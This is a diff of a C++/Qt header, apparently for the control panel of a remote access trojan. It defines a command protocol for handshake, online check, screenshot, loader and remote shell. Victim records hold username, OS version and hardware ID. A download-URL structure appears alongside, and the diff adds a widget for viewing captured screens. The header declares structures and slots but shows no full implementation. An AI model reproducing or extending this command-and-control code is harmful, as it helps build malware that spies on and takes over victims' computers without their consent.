@@ -6,32 +6,53 @@
 #include <QWidget>
 #include <QThread>
 #include <QFile>
+#include <QFileDialog>
+#include <QInputDialog>
+#include <QPixmap>
+#include <QMouseEvent>
+#include <QLabel>
+
 #include "sqlite3.h"
 #include "winsock.h"
 
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+Q_GUI_EXPORT QPixmap qt_pixmapFromWinHBITMAP(HBITMAP bitmap, int hbitmapFormat=0);
 
 QT_BEGIN_NAMESPACE
-namespace Ui { class MWindow; class Explorer; class ScreenShot; }
+namespace Ui { class MWindow; class Explorer; class ScreenShot; class WScreenShot; }
 QT_END_NAMESPACE
+
+#define CMD_HADSHAKE	0x0
+#define CMD_ONLINE		0x1
+#define CMD_OTVET_OK	0x2
+#define CMD_OTVET_ER	0x3
+#define CMD_SCREEN		0x4
+#define CMD_LOADER		0x5
+#define CMD_SHELL		0x6
+
+class WScreenShot : public QWidget
+{
+    Q_OBJECT
+private:
+    QPixmap pixmap;
+public:
+    explicit WScreenShot(QWidget *parent = nullptr);
+    ~WScreenShot();
+public slots:
+    void GetBitmap(BYTE *bytes, unsigned int Size, int w, int h);
+
+private:
+    Ui::WScreenShot *ui;
+};
 
 class WSocket  : public QObject
 {
     Q_OBJECT
 private:
-    enum {
-        CMD_HADSHAKE,
-        CMD_ONLINE,
-        CMD_OTVET_OK,
-        CMD_OTVET_ER,
-        CMD_SCREEN,
-        CMD_LOADER,
-        CMD_SHELL
-    };
+
 
     typedef struct CLIENTS
     {
-        SOCKET SOCKET;
         char USERNAME[100];
         char OSVER[100];
         char HWID[100];
@@ -39,20 +60,21 @@ private:
 
     typedef struct DLE
     {
-        char URL[1000];
+        char URL[1020];
     } DLE;
 
     typedef struct BIGSCREEN
     {
         int w;
         int h;
-        ULONG ZipSize;
+        DWORD ZipSize;
+        DWORD Size;
     } BIGSCREEN;
 
     typedef struct CMDiDATA
     {
         DWORD CMD;
-        char DATA[1000];
+        BYTE DATA[1020];
     } CMDiDATA;
 
     typedef NTSTATUS(NTAPI *fRtlDecompressBuffer)
@@ -111,37 +133,16 @@ public:
 public slots:
     void ReversCmd(int NOMER);
     void WaitClient();
-    void WaitShell(int NOMER);
+    void WaitShell();
     void CheckOnline();
+    void Recving(int NOMER);
+    void GetScreen(int NOMER);
 
 signals:
     void AddNewClient(int NOMER, char *IP, char *HWID, char *USERNAME, char *OSVER);
     void DelClient(int NOMER);
     void CloseShell();
-};
-
-class ScreenShot : public QWidget
-{
-    Q_OBJECT
-
-public:
-    explicit ScreenShot(QWidget *parent = nullptr);
-    ~ScreenShot();
-
-private:
-    Ui::ScreenShot *ui;
-};
-
-class Explorer : public QWidget
-{
-    Q_OBJECT
-
-public:
-    explicit Explorer(QWidget *parent = nullptr);
-    ~Explorer();
-
-private:
-    Ui::Explorer *ui;
+    void GetBitmap(BYTE *bytes, unsigned int Size, int w, int h);
 };
 
 class MWindow : public QMainWindow
@@ -151,8 +152,9 @@ class MWindow : public QMainWindow
 public:
     MWindow(QWidget *parent = nullptr);
     ~MWindow();
-    WSocket *wsocket80, *servHandl, *shellSocket;
-    QThread *mainSocketThread, *shellSocketThread;
+    WScreenShot *screenShot;
+    WSocket *wsocket80, *sendHandl, *shellSocket;
+    QThread *mainSocketThread, *shellSocketThread, *sendSocketThread;
 
 public slots:
     void sOpenMenu(QPoint pos);
@@ -173,8 +175,10 @@ private slots:
 signals:
     void ReversCmd(int NOMER);
     void WaitClient();
-    void WaitShell(int NOMER);
+    void WaitShell();
     void CheckOnline();
+    void GetScreen(int NOMER);
+    void Recving(int NOMER);
 
 private:
     QMenu *menu;
